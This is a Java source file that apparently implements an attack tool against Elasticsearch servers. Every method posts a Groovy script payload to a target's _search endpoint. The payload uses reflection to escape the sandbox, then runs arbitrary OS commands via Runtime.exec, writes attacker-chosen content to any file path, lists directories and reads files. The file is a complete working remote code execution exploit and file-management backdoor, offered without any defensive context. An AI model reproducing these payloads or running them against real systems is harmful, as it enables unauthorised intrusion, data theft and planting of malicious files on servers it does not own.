package org.vti.service.impl;

import java.util.ArrayList;
import java.util.List;

import org.vti.service.MyService;
import org.vti.util.RequestUtil;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

public class ESGroovyServiceImpl implements MyService{
	
	public String doExecuteCMD (String host, String param) throws Exception{
		
		String cmdUrl= "{\"size\":1,\"script_fields\": {\"exp\": {\"script\"" +
				":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\")" +
				".getConstructor(java.io.Reader.class)" +
				".newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\")" +
				".getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class" +
				".forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\""+param+"\\\")" +
				".getInputStream())).readLines()\",\"lang\": \"groovy\"}}}";
		
		String result= new RequestUtil().doPostRequest(host+"/_search?pretty",cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		JsonArray array=fields.get("exp").getAsJsonArray().get(0).getAsJsonArray();
		
		String str="";
		
		for (int i = 0; i < array.size(); i++) {
			str+=array.get(i).getAsString()+"\n";
		}
		
		return str;
	}

	@Override
	public boolean doUpload(String host, String path, String content)
			throws Exception {
		
		String cmdUrl= "{\"size\":1,\"script_fields\": {\"exp\": {\"script\"" +
				":\"java.lang.Math.class.forName(\\\"java.io.FileOutputStream\\\")" +
				".getConstructor(java.io.File.class)" +
				".newInstance(java.lang.Math.class.forName(\\\"java.io.File\\\")" +
				".getConstructor(java.lang.String.class)" +
				".newInstance(\\\""+ path +"\\\"))" +
				".write(java.lang.Math.class.forName(\\\"java.lang.String\\\")" +
				".getConstructor(java.lang.String.class).newInstance(\\\""+content+"\\\").getBytes())\"," +
				"\"lang\": \"groovy\"}}}";
		
		
		String result= new RequestUtil().doPostRequest(host+"/_search?pretty",cmdUrl);
		
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		String echo=fields.get("exp").getAsJsonArray().get(0).toString();
		
		if (echo.equals("null")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public List<String> listRoots(String host) throws Exception{
		
		String cmdUrl= "{\"size\":1,\"script_fields\": {\"exp\": {\"script\"" +
				":\"java.lang.Math.class.forName(\\\"java.io.File\\\")" +
				".listRoots()\",\"lang\": \"groovy\"}}}";
		
		String result= new RequestUtil().doPostRequest(host+"/_search?pretty",cmdUrl);
		
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		JsonArray array=fields.get("exp").getAsJsonArray().get(0).getAsJsonArray();
		
		List<String> list= new ArrayList<>();
			
		for (int i = 0; i < array.size(); i++) {
			list.add(array.getAsString());
		}
		return list;
	}

	@Override
	public List<String> getFiles(String host, String path) throws Exception {
		
		String cmdUrl= "{\"size\":1,\"script_fields\": {\"exp\": {\"script\"" +
				":\"java.lang.Math.class.forName(\\\"java.io.File\\\")" +
				".getConstructor(java.lang.String.class)" +
				".newInstance(\\\""+ path +"\\\").list()\",\"lang\": \"groovy\"}}}";
		
		String result= new RequestUtil().doPostRequest(host+"/_search?pretty",cmdUrl);
		
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		JsonArray array=fields.get("exp").getAsJsonArray().get(0).getAsJsonArray();
		
		if (array.size()>0) {
			List<String> list= new ArrayList<>();
			
			for (int i = 0; i < array.size(); i++) {
				list.add(array.get(i).getAsString());
			}
			return list;
		}else {
			return null;
		}
	}

	@Override
	public boolean isDirectory(String host, String path) throws Exception {
		
		String cmdUrl= "{\"size\":1,\"script_fields\": {\"exp\": {\"script\"" +
				":\"java.lang.Math.class.forName(\\\"java.io.File\\\")" +
				".getConstructor(java.lang.String.class)" +
				".newInstance(\\\""+ path +"\\\").isDirectory()\",\"lang\": \"groovy\"}}}";
		
		String result= new RequestUtil().doPostRequest(host+"/_search?pretty",cmdUrl);
		
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		boolean flag= fields.get("exp").getAsJsonArray().get(0).getAsBoolean();
		
		return flag;
		
	}

	@Override
	public String getFileContent(String host, String path) throws Exception {
		
		String cmdUrl= "{\"size\":1,\"script_fields\": {\"exp\": {\"script\"" +
				":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\")" +
				".getConstructor(java.io.Reader.class)" +
				".newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\")" +
				".getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class" +
				".forName(\\\"java.io.FileInputStream\\\").getConstructor(java.lang.String.class)" +
				".newInstance(\\\""+ path +"\\\")" +
				")).readLines()\",\"lang\": \"groovy\"}}}";
		
		String result= new RequestUtil().doPostRequest(host+"/_search?pretty",cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		JsonArray array=fields.get("exp").getAsJsonArray().get(0).getAsJsonArray();
		
		String text="";
		
		for (int i = 0; i < array.size(); i++) {
			text+=array.get(i).getAsString()+"\n";
		}
		
		return text;
		
	}
	
}
